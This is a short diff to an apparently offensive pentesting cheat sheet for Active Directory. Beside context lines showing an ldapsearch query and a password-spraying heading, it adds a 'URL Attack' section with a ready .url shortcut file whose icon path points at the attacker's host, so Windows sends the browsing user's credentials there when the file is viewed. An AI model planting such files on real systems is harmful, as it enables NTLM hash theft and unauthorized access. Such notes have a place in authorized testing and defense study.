@@ -88,7 +88,16 @@ ldapsearch -x -h $(cat ip) -p 389 -D  'user' -w 'pass' -b "dc=box,dc=local" -s s
 
 ```
 
+#### URL Attack
+> Save file @generalfile.url
 
+```
+[InternetShortcut]
+URL=helloworld
+WorkingDirectory=helloworld
+IconFile=\\MYIP\%USERNAME%.icon
+IconIndex=1
+```
 
 
 #### Password spray from LDAP / RPC findings
